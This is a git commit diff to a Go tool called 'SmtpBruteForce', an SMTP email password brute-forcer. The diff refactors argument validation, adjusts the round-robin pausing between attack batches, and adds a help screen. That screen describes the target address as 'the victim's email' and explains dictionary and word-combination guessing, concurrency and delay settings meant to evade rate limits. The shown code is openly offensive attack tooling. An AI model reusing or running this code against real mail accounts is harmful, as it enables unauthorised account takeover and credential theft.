982c68c4a67f22711b4d18c547f200b9714e55bf
Alejandro De Barrio Merino <alejandrodbm@gmail.com>
2018-09-22 20:28:34 +0200

    Update main.go

--- main.go
+++ main.go
@@ -102,8 +102,8 @@ func smtpAuth(username, password string) smtp.Auth {
 // MAIN FUNCTION
 func main() {
 	if len(os.Args[1:]) < 8 {
-		fmt.Printf("Error: missing argument...\n")
-		fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]\n", os.Args[0])
+		fmt.Printf("\nError: missing argument...\n\n")
+		help(fmt.Sprintf("[target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]"))
 		return
 	}
 	target = os.Args[1]
@@ -113,26 +113,28 @@ func main() {
 	maxProcs, _ := strconv.Atoi(os.Args[6])
 	delay, _ = strconv.Atoi(os.Args[7])
 	t, _ := strconv.Atoi(os.Args[8])
-	if t <= 0 {
-		t = 1
+	if t < 0 {
+		t = 0 // Round robin disabled by default
 	} else {
 		roundRobin = time.Second * time.Duration(t)
+		maxProcs = 1
+		delay = 0
 	}
 	if maxProcs <= 0 {
-		fmt.Printf("Error: procs must be \"1\" at least...\n")
-		fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]\n", os.Args[0])
+		fmt.Printf("\nError: procs must be \"1\" at least...\n\n")
+		help(fmt.Sprintf("[target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]"))
 		return
 	} else if delay < 0 {
-		fmt.Printf("Error: delay must be \"0\" at least...\n")
-		fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]\n", os.Args[0])
+		fmt.Printf("\nError: delay must be \"0\" at least...\n\n")
+		help(fmt.Sprintf("[target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]"))
 		return
 	}
 	switch mailServer.port {
 	case "465", "587":
 		bruteForce(wordsReader(wordDict), maxPwdLen, maxProcs)
 	default:
-		fmt.Printf("Error: wrong port -> %s\n", mailServer.port)
-		fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]\n", os.Args[0])
+		fmt.Printf("\nError: wrong port -> %s\n\n", mailServer.port)
+		help(fmt.Sprintf("[target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]"))
 		return
 	}
 	wg.Wait()
@@ -285,9 +287,11 @@ func pwdSender(maxPwdLen int, wordList []string, bfprocs chan string) {
 			data.CounterAdd()
 		}
 		bfprocs <- pwd
-		if time.Since(t) >= roundRobin {
-			time.Sleep(roundRobin)
-			t = time.Now()
+		if roundRobin > 0 {
+			if time.Since(t) >= roundRobin {
+				time.Sleep(roundRobin)
+				t = time.Now()
+			}
 		}
 	}
 	close(bfprocs)
@@ -353,4 +357,31 @@ func nextPwd(combNumber int, wordList []string) func() string {
 		}
 		return pass
 	}
+}
+
+// PRINT THE HELP
+func help(msj string) {
+	info := `=============================================================================================================================================================
+|                                                                 SmtpBruteForce V.1.0 - Help                                                               |
+=============================================================================================================================================================
+USAGE: ` + os.Args[0] + " " + msj + `
+
+EXAMPLE:
+       ` + os.Args[0] + ` none@server.com smtp.server.com 587 words.txt 3 1 100 30
+
+PARAMETERS:
+       [target email]:       The victim's email.
+       [smtp server]:        Host of the smtp server.
+       [smtp port: 465|587]: To specify port under service is listening (465/587 ports only).
+       [Keywords List]:      Text file fill with words separated by commas.
+       [Password length]:    Length of the resulted word in the combination process. if "1" is used, the words list is used as a simple dictionary
+                             but if the number is equal or greater than "2", the words contained in the text file will be used to build
+                             combinations growing until the length specified is reached.
+       [Number of procs]:    Amount of concurrent processes needed.
+       [Delay(ms)]:          Wait between concurrent processes before resuming re-execution.
+       [Round Robin(secs)]:  To specify between the battery of attacks and the waits expressed in seconds.
+                             * When this is enabled concurrency and delay is automatically disabled.
+                             * If "0" is set the round robin is disabled.
+=============================================================================================================================================================`
+	os.Stdout.Write([]byte(info + "\n"))
 }
